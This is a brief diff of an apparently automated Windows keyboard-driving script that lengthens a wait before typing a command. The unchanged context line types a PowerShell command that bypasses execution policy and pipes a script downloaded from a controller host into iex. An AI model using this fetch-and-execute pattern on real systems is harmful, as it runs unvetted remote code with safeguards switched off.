@@ -95,7 +95,7 @@ if (values.login) {
 if (values.launch) {
   await key('esc')
   await key('meta_l', 'r')
-  await delay(1500)
+  await delay(10000)
   await key('ctrl', 'a')
   await type(
     `powershell -nop -ep bypass -c "[Net.WebRequest]::DefaultWebProxy=$null;irm ${control.controller}/boot.ps1|iex"`,
